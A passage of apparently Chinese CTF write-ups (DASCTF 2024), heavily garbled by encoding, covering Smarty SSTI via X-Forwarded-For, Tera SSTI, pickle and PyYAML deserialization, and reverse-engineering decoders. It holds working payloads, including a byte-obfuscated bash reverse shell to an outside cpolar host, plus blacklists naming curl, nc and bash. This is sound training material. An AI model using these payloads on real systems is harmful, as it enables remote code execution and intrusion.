ä»¥æ¥æ”¶è¡¥ä¸ã€‚\nCVE-2021-29454â€”â€”Smartyæ¨¡æ¿æ³¨å…¥\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥å¦‚ä¸‹ä»£ç :\n1 string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026#34;\u0026lt;?php+phpinfo();\u0026#34;,$s)} ä½†ä¼ é€’è¿™ä¸ªPayloadéœ€è¦æ³¨å…¥ç‚¹,è¿™é‡Œåªæœ‰XFFå¯ä»¥å…¥æ‰‹\nBPè¿™æ ·å†™:\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET / HTTP/1.1 Host: node5.buuoj.cn:25829 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br DNT: 1 Sec-GPC: 1 Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i X-Forwarded-For: string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026#34;\u0026lt;?php+phpinfo();\u0026#34;,$s)} Content-Length: 2 å‘é€ä¸¤æ¬¡,å‘ç°è¯»åˆ°ç¯å¢ƒå˜é‡,ä»£ç æ‰§è¡ŒæˆåŠŸ\nç„¶åXFFä¼ é€’string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026quot;\u0026lt;?php+eval(system('ls /'));\u0026quot;,$s)}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 bin dev etc flag home lib media mnt opt proc root run sbin srv sys usr var è¯»åˆ°å­˜åœ¨flagç›®å½•,ç›´æ¥ cat /flag\nXFF payload: string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026quot;\u0026lt;?php+eval(system('cat /flag'));\u0026quot;,$s)}\nå¾—åˆ°flag\nReverse\r[BJDCTF2020]JustRE\rIDAæ‰“å¼€\nmainå‡½æ•°ä¸­ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿\nç‚¹å‡»èœå•æ çš„â€œViewâ€ï¼ˆè§†å›¾ï¼‰\u0026gt;â€œOpen subviewsâ€ï¼ˆæ‰“å¼€å­è§†å›¾ï¼‰\u0026gt;â€œStringsâ€ï¼ˆå­—ç¬¦ä¸²ï¼‰æ‰“å¼€å­—ç¬¦ä¸²çª—å£\nå‘ç°BJD{%d%d2069a45792d233ac},è·Ÿè¿›çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4) { CHAR String[100]; // [esp+0h] [ebp-64h] BYREF if ( a2 != 272 ) { if ( a2 != 273 ) return 0; if ( (_WORD)a3 != 1 \u0026amp;\u0026amp; (_WORD)a3 != 2 ) { sprintf(String, Format, ++dword_4099F0); if ( dword_4099F0 == 19999 ) { sprintf(String, \u0026#34; BJD{%d%d2069a45792d233ac}\u0026#34;, 19999, 0); SetWindowTextA(hWnd, String); return 0; } SetWindowTextA(hWnd, String); return 0; } EndDialog(hWnd, (unsigned __int16)a3); } return 1; } è¿™é‡Œåˆ¤æ–­æ˜¯å¦ç‚¹å‡»æ¬¡æ•°æ˜¯19999æ¬¡ï¼ŒFormat ç‚¹è¿›å»æ˜¯â€˜æ‚¨å·²ç»ç‚¹äº† %d æ¬¡â€™ï¼Œè¯´æ˜dword_4099F0å­˜çš„æ˜¯ç‚¹å‡»æ¬¡æ•°ã€‚ç„¶ååˆ¤æ–­æ˜¯å¦ç‚¹å‡»19999æ¬¡ï¼Œè¾“å‡ºBJD{1999902069a45792d233ac}\nè¯´æ˜flagæ˜¯BJD{1999902069a45792d233ac}\nå‚è€ƒï¼š\n[BJDCTF2020]JustRE\n","date":"2025-06-01T10:28:42+08:00","image":"https://c.img.dasctf.com/LightPicture/2024/10/993ae115bf4e5120.png","permalink":"https://Oight.github.io/p/dasctf2024%E5%8D%81%E6%9C%88%E8%B5%9B/","title":"DASCTF2024åæœˆèµ›"},{"content":"Chicken\r1.ç­¾åˆ°é¢˜\rè¿›å…¥å®¹å™¨å‘ç°ä¼šå…ˆåœ¨https://game.wetolink.com/åœç•™ä¸€æ®µæ—¶é—´ç„¶åä¼šè·³è½¬åˆ°https://game.gcsis.cn/compete/home/8c3adb14b154482\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç±»ä¼¼äºéœ€è¦â€œä¹°ä¸œè¥¿â€ä¹‹ç±»çš„WEBé¢˜ï¼Œéœ€è¦è·å–ç®¡ç†å‘˜æƒé™ï¼Œæ›´æ”¹æ•°æ®ä¹‹ç±»çš„æ“ä½œ\nåæ ¹æ®hintï¼Œå‘ç°åªéœ€è¦æ‰«ä¸€ä¸‹https://game.wetolink.com/ï¼Œå‘ç°robots.txtï¼Œè®¿é—®robots.txtå¾—åˆ°flag\n2.è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨\rå› ä¸ºé¢˜ç›®é‡Œæœ‰ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶çš„åŠŸèƒ½ä»¥åŠä¼šæœ‰ç®¡ç†å‘˜çœ‹è§çš„å­—æ ·ï¼Œä»¥ä¸ºæ˜¯XSSï¼Œä½†æ²¡å‘ç°æ³¨å…¥ç‚¹\nåhintä¸­è¯´â€œé˜Ÿåå¥½åƒå¯ä»¥ 81 â€ã€â€œæ˜¯ Rust å—ï¼ˆå–œï¼‰â€ã€ â€œä¸ç”¨RCEï¼Œæ‹¿åˆ°ç¯å¢ƒå˜é‡FLAGçš„å†…å®¹å³å¯ã€‚â€\nåœ¨FLAGå…‘æ¢åŒºåŸŸè¾“å…¥â€81â€œ,è¿”å›â€œ81â€è¯´æ˜å­˜åœ¨SSTI\nç”±é¢˜å¯çŸ¥ï¼Œè¿™é“é¢˜æ˜¯RUSTå†™çš„ã€‚æŸ¥è¯¢èµ„æ–™å¾—çŸ¥RUSTä¸­å¸¸è§çš„WEBæ¨¡æ¿æœ‰ï¼š\nTera\n1 Tera æ˜¯Rustä¸­ä¸€ä¸ªé«˜æ€§èƒ½çš„æ¨¡æ¿å¼•æ“ï¼Œç±»ä¼¼äºJinja2ï¼ˆPythonï¼‰å’ŒLiquidï¼ˆRubyï¼‰ã€‚å®ƒæ”¯æŒå¤æ‚çš„æ¨¡æ¿åŠŸèƒ½ï¼Œä½†å¦‚æœè¾“å…¥æ²¡æœ‰å¾—åˆ°é€‚å½“çš„éªŒè¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æ³¨å…¥æ¨¡æ¿ä»£ç æ¥è§¦å‘SSTIæ¼æ´ã€‚ Tera GitHub\nAskama\n1 Askama æ˜¯å¦ä¸€ä¸ªRustæ¨¡æ¿å¼•æ“ï¼Œé‡‡ç”¨ç¼–è¯‘æ—¶æ¨¡æ¿æ¸²æŸ“ã€‚å®ƒæ˜¯åŸºäºRustçš„ç±»å‹ç³»ç»Ÿï¼Œæ¨¡æ¿æ˜¯åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æŸ¥çš„ï¼Œè¿™æ„å‘³ç€åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥é¿å…SSTIæ”»å‡»ï¼Œå› å…¶ä¸å…è®¸ä»»æ„çš„åŠ¨æ€ä»£ç æ‰§è¡Œã€‚ Askama GitHub\nHandlebars\n1 Handlebars æ˜¯ä¸€ä¸ªæµè¡Œçš„æ¨¡æ¿å¼•æ“ï¼ŒRustä¸­çš„å®ç°é€šå¸¸ä¸º handlebars-rustã€‚ä¸å…¶ä»–æ¨¡æ¿å¼•æ“ä¸€æ ·ï¼Œå¦‚æœä¸å½“ä½¿ç”¨ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´SSTIæ¼æ´ã€‚ Handlebars GitHub\næŸ¥è¯¢å¾—çŸ¥è¿™é“é¢˜ä½¿ç”¨Teraæ¨¡æ¿\nTeraçš„SSTI\nåœ¨å…¶ä¸­æœ‰\n1 2 3 So, the session store used by the application is a CookieStore, where the secret used comes from the SECRET environment variable! So, if we can leak the SECRET env var, we could sign our own sessions with arbitrary data (since the complete session data is stored in the cookie). Okay, let\u0026#39;s do this. Following Tera\u0026#39;s format, we can leak the session with {{ get_env(name=\u0026#34;SECRET\u0026#34;) }}: å¯ä»¥å‘ç°è¿™é“é¢˜ä¹Ÿæ˜¯æ²¡æ³•RCEä½†å¯ä»¥æ³„éœ²ç¯å¢ƒå˜é‡ï¼Œä½†æ˜¾ç„¶CORCTFä¸­çš„è¿™é“é¢˜æ›´éš¾ï¼ˆæ¯•ç«ŸDASCTFä¸­çš„è¿™é“ç­¾åˆ°é¢˜åªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼‰\næ‰€ä»¥æˆ‘ä»¬çŸ¥é“åœ¨Tera ä¸­åˆ©ç”¨SSTIè¯»å–ç¯å¢ƒå˜é‡å¯ä»¥ä½¿ç”¨ get_env è¿™ä¸ªå†…ç½®å‡½æ•°ï¼Œå…¶æ ¼å¼ä¸ºï¼š\n1 {{ get_env(name=\u0026#34;SECRET\u0026#34;) }} æˆ‘ä»¬è¦è¯»FLAGçš„å†…å®¹ï¼Œæ‰€ä»¥payloadä¸º\n1 {{ get_env(name=\u0026#34;FLAG\u0026#34;) }} å¾—åˆ°flag\nWEB\rconst_python\ræœ‰ä¸€è¯´ä¸€ï¼Œè¿™æ¬¡ const_python å’Œ yaml_matser ä¸¤é“WEBé¢˜éƒ½æ²¡å›æ˜¾ï¼Œç¬¬ä¸€æ¬¡åšè¿™æ ·çš„é¢˜ï¼Œæ‰€ä»¥å¾ˆä¸é€‚åº”\nhintæç¤ºåœ¨ /src ä¸­å¯ä»¥è¯»åˆ°æºç ï¼Œè¿›å…¥å…¶ä¸­ç›´æ¥å¾—åˆ°ä¸€éƒ¨åˆ†æºç ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†æºç è—åœ¨HTMLæ³¨é‡Šé‡Œï¼Œæºç æ˜¯ç”¨Pythonå†™çš„\næºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 plaintext import builtins import io import sys import uuid from flask import Flask, request,jsonify,session import pickle import base64 app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) class User: def __init__(self, username, password, auth=\u0026#39;ctfer\u0026#39;): self.username = username self.password = password self.auth = auth password = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) Admin = User(\u0026#39;admin\u0026#39;, password,\u0026#34;admin\u0026#34;) @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#34;Welcome to my application\u0026#34; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def post_login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username == \u0026#39;admin\u0026#39; : if password == admin.password: session[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#34; return \u0026#34;Welcome Admin\u0026#34; else: return \u0026#34;Invalid Credentials\u0026#34; else: session[\u0026#39;username\u0026#39;] = username return \u0026#39;\u0026#39;\u0026#39; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;!-- /src may help you\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/ppicklee\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def ppicklee(): data = request.form[\u0026#39;data\u0026#39;] sys.modules[\u0026#39;os\u0026#39;] = \u0026#34;not allowed\u0026#34; sys.modules[\u0026#39;sys\u0026#39;] = \u0026#34;not allowed\u0026#34; try: pickle_data = base64.b64decode(data) for i in {\u0026#34;os\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#39;setstate\u0026#39;, \u0026#34;globals\u0026#34;, \u0026#39;exec\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;template\u0026#39;, \u0026#39;render\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;requests\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;pickle\u0026#39;,\u0026#34;class\u0026#34;,\u0026#34;mro\u0026#34;,\u0026#34;flask\u0026#34;,\u0026#34;sys\u0026#34;,\u0026#34;base\u0026#34;,\u0026#34;init\u0026#34;,\u0026#34;config\u0026#34;,\u0026#34;session\u0026#34;}: if i.encode() in pickle_data: return i+\u0026#34; waf !!!!!!!\u0026#34; pickle.loads(pickle_data) return \u0026#34;success pickle\u0026#34; except Exception as e: return \u0026#34;fail pickle\u0026#34; @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def admin(): username = session[\u0026#39;username\u0026#39;] if username != \u0026#34;admin\u0026#34;: return jsonify({\u0026#34;message\u0026#34;: \u0026#39;You are not admin!\u0026#39;}) return \u0026#34;Welcome Admin\u0026#34; @app.route(\u0026#39;/src\u0026#39;) def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=False, port=5000) å‘ç°ä¸€å…±ä¸‰ä¸ªè·¯ç”±ï¼Œ /srcã€/ppicklee å’Œ /admin\nè¿›å…¥/admin è·¯ç”±ä¸­æç¤ºæ²¡æœ‰æƒé™ï¼Œä»¥ä¸ºæ˜¯è¦é€šè¿‡æ›´æ”¹SESSIDè·å–ç®¡ç†å‘˜æƒé™ï¼Œæ¥å¾—åˆ°flag ä½†æ˜¯è¿™é“é¢˜ä¸‰ä¸ªè·¯ç”±ä¸­éƒ½æ²¡æœ‰Cooikeï¼Œæ— æ³•æˆåŠŸ\nå†è¯»æºç ï¼Œå‘ç°å¯ä»¥/ppicklee è·¯ç”±ä¸­å­˜åœ¨é˜²ç«å¢™ï¼Œæ‰€ä»¥ç»•è¿‡é˜²ç«å¢™ï¼Œçœ‹çœ‹èƒ½å¦ä» /ppicklee è·¯ç”±ä¸­å¾—åˆ°ä»€ä¹ˆ ä½¿ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pickle import base64 # ä½¿ç”¨ subprocess æ¥ç»•è¿‡ class Exploit: def __reduce__(self): return (getattr, (\u0026#39;subprocess\u0026#39;, \u0026#39;Popen\u0026#39;, (\u0026#39;cat /flag\u0026#39;,))) # åˆ›å»ºæ¶æ„å¯¹è±¡ exploit_obj = Exploit() # å°†æ¶æ„å¯¹è±¡åºåˆ—åŒ–ä¸º pickle æ•°æ® pickled_data = pickle.dumps(exploit_obj) # ç¼–ç ä¸º base64 encoded_data = base64.b64encode(pickled_data).decode() print(encoded_data) ä½¿ç”¨POSTmanä¼ å‚ï¼Œå‘ç°åªèƒ½å¾—åˆ° success pickle æ— æ³•å¾—åˆ°flagï¼Œé‚æ”¾å¼ƒ\nåç”±WPå¯çŸ¥ï¼Œå› ä¸º src è·¯ç”±ä¼šè¯»å– app.py å†…å®¹å¹¶è¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å…ˆè¯»å–flagï¼Œå†æŠŠflagçš„å†…å®¹å†™å…¥åˆ° app.py\nå¯ä»¥ä½¿ç”¨pkerï¼š\nPker\n1 2 3 4 5 6 7 8 9 10 getattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) open = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;open\u0026#39;) flag=open(\u0026#39;/flag\u0026#39;) read=getattr(flag, \u0026#39;read\u0026#39;) f=open(\u0026#39;./app.py\u0026#39;,\u0026#39;w\u0026#39;) write=getattr(f, \u0026#39;write\u0026#39;) fff=read() write(fff) return åœ¨ ppicklee è·¯ç”±ä¸­ä¼ å‚ï¼Œç„¶ååœ¨ src è·¯ç”±ä¸­å¾—åˆ°flag\nè¿™é“é¢˜æ¶‰åŠpickleååºåˆ—åŒ–ï¼Œåœ¨è¿™é‡Œç²˜ä¸€ä¸ªpickleååºåˆ—åŒ–ç›¸å…³çš„åšå®¢\nPickleååºåˆ—åŒ–åˆæ¢\nyaml_matser\ræºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 plaintext import os import re import yaml from flask import Flask, request, jsonify, render_template app = Flask(__name__, template_folder=\u0026#39;templates\u0026#39;) UPLOAD_FOLDER = \u0026#39;uploads\u0026#39; os.makedirs(UPLOAD_FOLDER, exist_ok=True) def waf(input_str): blacklist_terms = {\u0026#39;apply\u0026#39;, \u0026#39;subprocess\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;map\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;sleep\u0026#39;, \u0026#39;setstate\u0026#39;, \u0026#39;command\u0026#39;,\u0026#39;static\u0026#39;,\u0026#39;templates\u0026#39;,\u0026#39;session\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;builtins\u0026#39; \u0026#39;run\u0026#39;, \u0026#39;ntimeit\u0026#39;, \u0026#39;bash\u0026#39;, \u0026#39;zsh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;before_request\u0026#39;, \u0026#39;after_request\u0026#39;, \u0026#39;error_handler\u0026#39;, \u0026#39;add_url_rule\u0026#39;,\u0026#39;teardown_request\u0026#39;,\u0026#39;teardown_appcontext\u0026#39;,\u0026#39;\\\\u\u0026#39;,\u0026#39;\\\\x\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;base64\u0026#39;,\u0026#39;join\u0026#39;} input_str_lower = str(input_str).lower() for term in blacklist_terms: if term in input_str_lower: print(f\u0026#34;Found blacklisted term: {term}\u0026#34;) return True return False file_pattern = re.compile(r\u0026#39;.*\\.yaml$\u0026#39;) def is_yaml_file(filename): return bool(file_pattern.match(filename)) @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#39;\u0026#39;\u0026#39; Welcome to DASCTF X 0psu3 \u0026lt;br\u0026gt; Here is the challenge \u0026lt;a href=\u0026#34;/upload\u0026#34;\u0026gt;Upload file\u0026lt;/a\u0026gt; \u0026lt;br\u0026gt; Enjoy it \u0026lt;a href=\u0026#34;/Yam1\u0026#34;\u0026gt;Yam1\u0026lt;/a\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: try: uploaded_file = request.files[\u0026#39;file\u0026#39;] if uploaded_file and is_yaml_file(uploaded_file.filename): file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename) uploaded_file.save(file_path) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;uploaded successfully\u0026#34;}), 200 else: return jsonify({\u0026#34;error\u0026#34;: \u0026#34;Just YAML file\u0026#34;}), 400 except Exception as e: return jsonify({\u0026#34;error\u0026#34;: str(e)}), 500 return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/Yam1\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def Yam1(): filename = request.args.get(\u0026#39;filename\u0026#39;,\u0026#39;\u0026#39;) if filename: with open(f\u0026#39;uploads/{filename}.yaml\u0026#39;, \u0026#39;rb\u0026#39;) as f: file_content = f.read() if not waf(file_content): test = yaml.load(file_content) print(test) return \u0026#39;welcome\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() è¿›å…¥å‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œä¸”åªèƒ½ä¸Šä¼  .yaml æ–‡ä»¶\nä¸€å¼€å§‹å°è¯•ç›´æ¥è¾“å‡ºflagï¼Œä½¿ç”¨\n1 2 3 4 5 !!python/object:__main__.MyClass args: !!python/tuple - !!python/name:globals - \u0026#34;os.system\u0026#34; - \u0026#34;echo hello\u0026#34; æ— æœ\nç”±WPå¾—çŸ¥è¿™æ˜¯ä¸€é“pyYamlååºåˆ—åŒ–\nPyYamlååºåˆ—åŒ–æ¼æ´è¯¦è§£\né»‘åå•ä¸­é‡‡ç”¨äº†åˆ—ä¸¾æ³•æ¥é˜²æ­¢æ”»å‡»ï¼Œå¯ä»¥ä»è¿™é‡Œå…¥æ‰‹ï¼Œå‘ç°æ²¡æœ‰ç¦exec\nä¸Šä¼ å†…å®¹ï¼š\n1 2 3 4 5 6 !!python/object/new:type args: [\u0026#39;z\u0026#39;, !!python/tuple [], {\u0026#39;extend\u0026#39;: !!python/name:exec }] listitems: \u0026#39;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49] ).decode())\u0026#39; #__import__(\u0026#39;os\u0026#39;).__getattribute__(\u0026#39;system\u0026#39;)(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/31.tcp.cpolar.top 13190 0\u0026gt;\u0026amp;1\u0026#39;) å»ºç«‹åå‘shellï¼Œå¾—åˆ°flag\nReverse\rtryre\ræ ¹æ®æä¾›çš„ä»£ç ç‰‡æ®µï¼Œå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªæ··åˆäº† Base64 ç¼–ç ã€å¼‚æˆ–æ“ä½œå’Œå­—ç¬¦æ˜ å°„çš„åŠ å¯†éªŒè¯é€»è¾‘ã€‚æˆ‘ä»¬éœ€è¦é€†å‘æ¯ä¸€æ­¥æ“ä½œæ¥ç¼–å†™è§£å¯†è„šæœ¬ï¼Œä»¥è¿˜åŸåŸå§‹çš„è¾“å…¥å­—ç¬¦ä¸²ã€‚ ä»¥ä¸‹æ˜¯è§£å¯†è¿‡ç¨‹çš„åˆ†æ­¥è§£æå’Œ Python è„šæœ¬å®ç°: è§£å¯†æ­¥éª¤è§£æ 1.Base64 æ˜ å°„è¡¨(aZyxabcdefghijk) è‡ªå®šä¹‰çš„ Base64 å­—ç¬¦æ˜ å°„è¡¨:\n1 ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/ åŠ å¯†æ—¶ä½¿ç”¨äº†è¿™ä¸ªæ˜ å°„è¡¨å¯¹æ•°æ®è¿›è¡Œç¼–ç ï¼Œè§£å¯†æ—¶éœ€è¦åå‘æŸ¥æ‰¾æ˜ å°„ã€‚ 2.åŠ å¯†æ•°æ®(v21): åŠ å¯†çš„ç›®æ ‡å­—ç¬¦ä¸²ä¸º:\n1 M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2? 3.Base64 ç¼–ç é€»è¾‘ æ•°æ®è¢«åˆ†ä¸º 3å­—èŠ‚ä¸€ç»„ï¼Œç»è¿‡ä½ç§»å’Œåˆ†ç»„æ“ä½œæ˜ å°„åˆ° Base64 è¡¨çš„ç´¢å¼•ä¸­ã€‚ è§£å¯†æ—¶éœ€è¦é€†å‘è¿™äº›ä½ç§»å’Œç»„è£…æ“ä½œï¼Œè¿˜åŸåŸå§‹çš„å­—èŠ‚åºåˆ—ã€‚\n4.å¼‚æˆ–æ“ä½œ: åœ¨åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œæœ€ç»ˆçš„ Base64 ç¼–ç ç»“æœè¢«é€å­—èŠ‚ä¸ 2è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚ è§£å¯†æ—¶éœ€è¦å†æ¬¡é€å­—èŠ‚ä¸ 2 è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œæ¢å¤åŸå§‹æ•°æ®ã€‚\néªŒè¯é€»è¾‘:è§£å¯†åçš„æ•°æ®ä¸ v21 é€å­—èŠ‚å¯¹æ¯”ï¼Œå¦‚æœå®Œå…¨ç›¸åŒï¼Œåˆ™éªŒè¯é€šè¿‡\nä½¿ç”¨å¦‚ä¸‹è„šæœ¬è¿›è¡Œè§£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # è‡ªå®šä¹‰ Base64 å­—ç¬¦æ˜ å°„è¡¨ custom_base64 = \u0026#34;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\u0026#34; reverse_base64 = {char: idx for idx, char in enumerate(custom_base64)} # åŠ å¯†æ•°æ® encrypted = \u0026#34;M@ASL3MF`uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?\u0026#34; # è§£å¯†ï¼šé€å­—èŠ‚å¼‚æˆ–è¿˜åŸ def xor_decrypt(data, key=2): return \u0026#39;\u0026#39;.join(chr(ord(char) ^ key) for char in data) # è§£å¯†ï¼šBase64 è‡ªå®šä¹‰è¡¨è§£ç  def custom_base64_decode(data): decoded_bytes = [] for i in range(0, len(data), 4): chunk = data[i:i + 4] # å¤„ç†å¡«å……å­—ç¬¦ \u0026#39;=\u0026#39; padding = chunk.count(\u0026#39;=\u0026#39;) chunk = chunk.replace(\u0026#39;=\u0026#39;, \u0026#39;A\u0026#39;) # ä¸´æ—¶æ›¿æ¢å¡«å……å­—ç¬¦ï¼Œç”¨äºè§£ç  # é€å­—èŠ‚è§£ç  b1 = reverse_base64[chunk[0]] \u0026lt;\u0026lt; 2 | reverse_base64[chunk[1]] \u0026gt;\u0026gt; 4 b2 = (reverse_base64[chunk[1]] \u0026amp; 0xF) \u0026lt;\u0026lt; 4 | reverse_base64[chunk[2]] \u0026gt;\u0026gt; 2 b3 = (reverse_base64[chunk[2]] \u0026amp; 0x3) \u0026lt;\u0026lt; 6 | reverse_base64[chunk[3]] decoded_bytes.extend([b1, b2, b3]) # æ ¹æ®å¡«å……å­—ç¬¦è°ƒæ•´è§£ç ç»“æœ if padding \u0026gt; 0: decoded_bytes = decoded_bytes[:-padding] return bytes(decoded_bytes) # è§£å¯†è¿‡ç¨‹ def decrypt(encrypted): # Step 1: é€å­—èŠ‚å¼‚æˆ–è¿˜åŸ after_xor = xor_decrypt(encrypted) # Step 2: ä½¿ç”¨è‡ªå®šä¹‰ Base64 è¡¨è§£ç  decoded = custom_base64_decode(after_xor) return decoded.decode(\u0026#39;utf-8\u0026#39;) # è°ƒç”¨è§£å¯†å‡½æ•° try: decrypted = decrypt(encrypted) print(\u0026#34;è§£å¯†ç»“æœ:\u0026#34;, decrypted) except Exception as e: print(\u0026#34;è§£å¯†å¤±è´¥:\u0026#34;, e) è¿è¡Œå¾—åˆ°flag\nsecret_of_inkey\rè¿›å…¥å‘ç°æ˜¯å°æ¸¸æˆ\nå¯ä»¥ç©å‡ºflagæ¥ï¼ˆbushiï¼‰\nåœ¨WPä¸­çœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„è§£æ³• ï¼šä½¿ç”¨pyautoguiæ¥è¿›è¡Œè‡ªåŠ¨åŒ–è„šæœ¬æ“ä½œã€‚\npyautoguiï¼ˆæ§åˆ¶é¼ æ 